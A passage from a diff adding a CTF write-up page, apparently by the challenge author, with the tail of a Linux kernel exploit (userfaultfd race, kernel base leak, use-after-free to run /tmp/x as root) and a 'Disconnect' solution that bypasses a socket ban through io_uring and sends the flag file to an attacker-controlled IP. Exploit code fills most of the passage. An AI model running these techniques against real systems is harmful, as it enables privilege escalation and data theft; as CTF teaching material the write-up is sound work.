+    <span style="color:#66d9ef">if</span> (read(uffd, <span style="color:#f92672">&amp;</span>msg, <span style="color:#66d9ef">sizeof</span>(msg)) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) die(<span style="color:#e6db74">&#34;read(uffd)&#34;</span>);
+    assert (msg.event <span style="color:#f92672">==</span> UFFD_EVENT_PAGEFAULT);
+
+    printf(<span style="color:#e6db74">&#34;[+] uffd: flag=0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, msg.arg.pagefault.flags);
+    printf(<span style="color:#e6db74">&#34;[+] uffd: addr=0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, msg.arg.pagefault.address);
+    <span style="color:#66d9ef">if</span> (uffd_stage <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
+      uffd_stage1();
+    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (uffd_stage <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
+      uffd_stage2();
+    }
+    uffd_stage<span style="color:#f92672">++</span>;
+    <span style="color:#75715e">//----------------------------------------------
+</span><span style="color:#75715e"></span>
+    copy.src <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)buf;
+    copy.dst <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)msg.arg.pagefault.address;
+    copy.len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
+    copy.mode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    copy.copy <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">if</span> (ioctl(uffd, UFFDIO_COPY, <span style="color:#f92672">&amp;</span>copy) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) die(<span style="color:#e6db74">&#34;ioctl(UFFDIO_COPY)&#34;</span>);
+  }
+
+  <span style="color:#66d9ef">return</span> NULL;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">register_uffd</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>addr, size_t len) {
+  <span style="color:#75715e">/* uffd template from https://pawnyable.cafe/ */</span>
+  <span style="color:#66d9ef">struct</span> uffdio_api uffdio_api;
+  <span style="color:#66d9ef">struct</span> uffdio_register uffdio_register;
+  <span style="color:#66d9ef">long</span> uffd;
+  pthread_t th;
+
+  <span style="color:#75715e">/* Register userfaultfd */</span>
+  uffd <span style="color:#f92672">=</span> syscall(__NR_userfaultfd, O_CLOEXEC <span style="color:#f92672">|</span> O_NONBLOCK);
+  <span style="color:#66d9ef">if</span> (uffd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) die(<span style="color:#e6db74">&#34;userfaultfd&#34;</span>);
+
+  uffdio_api.api <span style="color:#f92672">=</span> UFFD_API;
+  uffdio_api.features <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">if</span> (ioctl(uffd, UFFDIO_API, <span style="color:#f92672">&amp;</span>uffdio_api) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+    die(<span style="color:#e6db74">&#34;ioctl(UFFDIO_API)&#34;</span>);
+
+  <span style="color:#75715e">/* Register uffd page */</span>
+  uffdio_register.range.start <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)addr;
+  uffdio_register.range.len <span style="color:#f92672">=</span> len;
+  uffdio_register.mode <span style="color:#f92672">=</span> UFFDIO_REGISTER_MODE_MISSING;
+  <span style="color:#66d9ef">if</span> (ioctl(uffd, UFFDIO_REGISTER, <span style="color:#f92672">&amp;</span>uffdio_register) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+    die(<span style="color:#e6db74">&#34;UFFDIO_REGISTER&#34;</span>);
+
+  <span style="color:#75715e">/* Create thread when page fault */</span>
+  <span style="color:#66d9ef">if</span> (pthread_create(<span style="color:#f92672">&amp;</span>th, NULL, fault_handler_thread, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)uffd))
+    die(<span style="color:#e6db74">&#34;pthread_create&#34;</span>);
+
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">seq_open</span>()
+{
+	<span style="color:#66d9ef">int</span> seq;
+	<span style="color:#66d9ef">if</span> ((seq<span style="color:#f92672">=</span>open(<span style="color:#e6db74">&#34;/proc/self/stat&#34;</span>, O_RDONLY))<span style="color:#f92672">==-</span><span style="color:#ae81ff">1</span>)
+	{
+		puts(<span style="color:#e6db74">&#34;[X] Seq Open Error&#34;</span>);
+		exit(<span style="color:#ae81ff">0</span>);
+	}
+	<span style="color:#66d9ef">return</span> seq;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+
+    system(<span style="color:#e6db74">&#34;echo -ne &#39;#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">/bin/cp /root/flag.txt /tmp/flag.txt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">/bin/chmod 777 /tmp/flag.txt&#39; &gt; /tmp/x&#34;</span>);
+    system(<span style="color:#e6db74">&#34;chmod +x /tmp/x&#34;</span>);
+    system(<span style="color:#e6db74">&#34;echo -ne &#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff&#39; &gt; /tmp/crash&#34;</span>);
+    system(<span style="color:#e6db74">&#34;chmod +x /tmp/crash&#34;</span>);
+
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>master_pw;
+    buf <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x3000</span>);
+
+    CPU_ZERO(<span style="color:#f92672">&amp;</span>pwn_cpu);
+    CPU_SET(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>pwn_cpu);
+    <span style="color:#66d9ef">if</span> (sched_setaffinity(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(cpu_set_t), <span style="color:#f92672">&amp;</span>pwn_cpu))
+      die(<span style="color:#e6db74">&#34;sched_setaffinity&#34;</span>);
+  
+    <span style="color:#75715e">// open device
+</span><span style="color:#75715e"></span>    fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/kernpass&#34;</span>, O_RDWR);
+    <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) die(<span style="color:#e6db74">&#34;Open device failed&#34;</span>);
+   
+    <span style="color:#75715e">// Prepare uffd
+</span><span style="color:#75715e"></span>    page <span style="color:#f92672">=</span> mmap(NULL, <span style="color:#ae81ff">0x3000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE, MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>); 
+    register_uffd(page, <span style="color:#ae81ff">0x3000</span>);
+
+    <span style="color:#75715e">// Leak kbase
+</span><span style="color:#75715e"></span>    memset(buf, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">0x20</span>);
+    add_password(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>, buf);  
+
+    check_password(<span style="color:#ae81ff">0</span>, page);
+    hexdump(page, <span style="color:#ae81ff">0x100</span>);
+    kbase <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>)(page<span style="color:#f92672">+</span><span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4148d0</span>;
+    printf(<span style="color:#e6db74">&#34;[+] kbase: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kbase);
+
+    <span style="color:#75715e">// Overlap chunk
+</span><span style="color:#75715e"></span>    memset(buf, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">0x10</span>);
+    add_password(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x10</span>, buf);
+    <span style="color:#75715e">// setup fake entity  
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>)(buf) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
+    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>)(buf<span style="color:#f92672">+</span><span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1a8be80</span>;
+    <span style="color:#75715e">// trigger UAF
+</span><span style="color:#75715e"></span>    edit_password(<span style="color:#ae81ff">0</span>, page<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2000</span>);
+
+    edit_password(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;/tmp/x&#34;</span>);
+    
+    system(<span style="color:#e6db74">&#34;/tmp/crash&#34;</span>);
+    system(<span style="color:#e6db74">&#34;cat /tmp/flag.txt&#34;</span>);
+
+    
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h1 id="disconnect-500-points--1-solve">Disconnect (500 points / 1 solve)</h1>
+<p><img src="https://i.imgur.com/5VpjYNo.jpg" alt="Imgur"></p>
+<p>The idea of this challenge is very simple, just banned <code>socket</code> syscall. Players are required to get the flag without using <code>socket</code> syscall.</p>
+<p>I want to keep the challenge as lightweight as possible, I didn&rsquo;t implement so much on the hardening and it surely possible to come up with several unintended solutions.</p>
+<p>In my team internal difficulty rating, we expected this would be a easy challenge for many expereinced pwners (especially kernel pwner) because of the hot topic of <code>io_uring</code> in KCTF in recent years.</p>
+<p>We are surprised that only one team solved it (an unintended solution from Shellphish&rsquo;s fork bomb with no mercy).</p>
+<h2 id="intended-solution">Intended Solution</h2>
+<p><a href="https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html">https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html</a></p>
+<p>READ this and you will find the anwser.
+<code>io_uring_enter</code> can used for performing I/O operation. One of the opcode is <code>IORING_OP_SOCKET</code>, it do the same as <code>socket</code> syscall&quot;</p>
+<p><a href="https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html#IORING_OP_SOCKET">https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html#IORING_OP_SOCKET</a></p>
+<blockquote>
+<p>Issue the equivalent of a socket(2) system call. fd must contain the communication domain, off must contain the communication type, len must contain the protocol, and rw_flags is currently unused and must be set to zero. See also socket(2) for the general description of the related system call. Available since 5.19.</p>
+</blockquote>
+<p>Through strace the solve script, there is not a single word &lsquo;socket&rsquo; in the result.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">io_uring_setup<span style="color:#f92672">(</span>1, <span style="color:#f92672">{</span>flags<span style="color:#f92672">=</span>0, sq_thread_cpu<span style="color:#f92672">=</span>0, sq_thread_idle<span style="color:#f92672">=</span>0, sq_entries<span style="color:#f92672">=</span>1, cq_entries<span style="color:#f92672">=</span>2, features<span style="color:#f92672">=</span>IORING_FEAT_SINGLE_MMAP|IORING_FEAT_NODROP|IORING_FEAT_SUBMIT_STABLE|IORING_FEAT_RW_CUR_POS|IORING_FEAT_CUR_PE4
+mmap<span style="color:#f92672">(</span>NULL, 388, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, 4, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f4004925000
+mmap<span style="color:#f92672">(</span>NULL, 64, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, 4, 0x10000000<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f4004924000
+io_uring_enter<span style="color:#f92672">(</span>4, 1, 0, 0, NULL, 8<span style="color:#f92672">)</span>     <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</code></pre></div><p>The above snip is part of the strace result of a socket fd creation.</p>
+<p>Once we have a socket fd, the rest of stuffs are a piece of cake.</p>
+<p><code>open flag -&gt; read flag -&gt; create io_uring socket -&gt; connect to your public server or webhook -&gt; send flag -&gt; solved</code></p>
+<h2 id="exploit-script-2">Exploit Script</h2>
+<p>You can retrieve the flag via listening on your public accessible machine or webhook services (e.g. requestbin)</p>
+<blockquote>
+<p>solve.c</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;liburing.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;YOUR PUBLIC IP&#34;</span>; <span style="color:#75715e">//change this
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">58888</span>; <span style="color:#75715e">//change this
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc , <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
+{
+    <span style="color:#66d9ef">struct</span> io_uring ring;
+    <span style="color:#66d9ef">struct</span> io_uring_sqe <span style="color:#f92672">*</span>sqe;
+    <span style="color:#66d9ef">struct</span> io_uring_cqe <span style="color:#f92672">*</span>cqe;
+    <span style="color:#66d9ef">char</span> message[<span style="color:#ae81ff">0x100</span>];
+    <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">0x100</span>];
+
+    memset(message, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100</span>);
+    memset(flag, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100</span>);
+
+    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/flag.txt&#34;</span>, <span style="color:#ae81ff">0</span>);                      
+
+    read(fd , flag, <span style="color:#ae81ff">0x100</span>);
+    write(<span style="color:#ae81ff">1</span>, flag, <span style="color:#ae81ff">0x100</span>);
+
+    io_uring_queue_init(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>ring, <span style="color:#ae81ff">0</span>);
+    sqe <span style="color:#f92672">=</span> io_uring_get_sqe(<span style="color:#f92672">&amp;</span>ring);
+    
+    sqe<span style="color:#f92672">-&gt;</span>opcode <span style="color:#f92672">=</span> IORING_OP_SOCKET;
+    sqe<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> AF_INET;
+    sqe<span style="color:#f92672">-&gt;</span>off <span style="color:#f92672">=</span> SOCK_STREAM;
+    sqe<span style="color:#f92672">-&gt;</span>len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;			
+    sqe<span style="color:#f92672">-&gt;</span>rw_flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    io_uring_submit(<span style="color:#f92672">&amp;</span>ring);
+    io_uring_wait_cqe(<span style="color:#f92672">&amp;</span>ring, <span style="color:#f92672">&amp;</span>cqe);
+
+    <span style="color:#66d9ef">int</span> sockfd <span style="color:#f92672">=</span> cqe<span style="color:#f92672">-&gt;</span>res;
+
+    strcat(message, <span style="color:#e6db74">&#34;GET /&#34;</span>);
+    strcat(message, flag);
+    strcat(message, <span style="color:#e6db74">&#34; HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
+    strcat(message, <span style="color:#e6db74">&#34;Connection: close</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>);
+
+    <span style="color:#75715e">// socket connection
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">struct</span> sockaddr_in info;
+    bzero(<span style="color:#f92672">&amp;</span>info,<span style="color:#66d9ef">sizeof</span>(info));
+    info.sin_family <span style="color:#f92672">=</span> PF_INET;
+
+    <span style="color:#75715e">// ip &amp; port
+</span><span style="color:#75715e"></span>    info.sin_addr.s_addr <span style="color:#f92672">=</span> inet_addr(ip);
+    info.sin_port <span style="color:#f92672">=</span> htons(port);
+
+    <span style="color:#66d9ef">int</span> err <span style="color:#f92672">=</span> connect(sockfd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>info, <span style="color:#66d9ef">sizeof</span>(info));
+    send(sockfd, message, <span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">0</span>);
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+</code></pre></div><blockquote>
+<p>upload.py</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chall-us.pwnable.hk&#34;</span>, <span style="color:#ae81ff">20003</span>)
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;solve&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> file:
+    data <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
+
+file_size <span style="color:#f92672">=</span> len(data)
+print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;file size: </span><span style="color:#e6db74">{</span>file_size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+r<span style="color:#f92672">.</span>sendline(str(file_size))
+sleep(<span style="color:#ae81ff">1</span>)
+print(<span style="color:#e6db74">&#34;Upload data&#34;</span>)
+r<span style="color:#f92672">.</span>send(data)
+sleep(<span style="color:#ae81ff">10</span>)
+</code></pre></div></div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/ctf">#ctf</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2023 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
